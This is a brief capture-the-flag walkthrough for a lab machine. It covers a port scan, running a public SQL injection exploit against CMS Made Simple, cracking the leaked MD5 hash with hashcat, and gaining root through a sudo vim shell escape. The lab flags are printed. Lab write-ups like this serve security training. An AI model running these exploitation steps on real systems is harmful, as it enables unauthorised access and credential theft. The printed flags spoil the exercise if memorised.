<pre>
Machine IP: 10.10.71.115

Enum:
    Open Ports:
        21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) -> CMS Made Simple vuln
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



searchsploit CMS Made Simple

CMS Made Simple < 2.2.10 - SQL Injection                                                                                              | exploits/php/webapps/46635.py

Mirror the exploit:

searchsploit -m exploits/php/webapps/46635.py python3 fixes errors 
An dn trexei kante edit ta print mesa sto script kai valte “()”

python3 46635.py -u http://10.10.71.115/simple/ -w /wordlist/path/rockyou.txt

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96

Twra thelei na kanoyme crack to hash
echo “0c01f4468bd75d7a84c7eb73846e8d96” > hash.txt

hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt

Pwd:secret
User flag : G00d j0b, keep up!
Root flag : W3ll d0n3. You made it!

$ id 
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)

$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

sudo vim /usr/bin/vim

And type ‘shift :!sh ’ and got root :DD
# id
uid=0(root) gid=0(root) groups=0(root)
</pre>
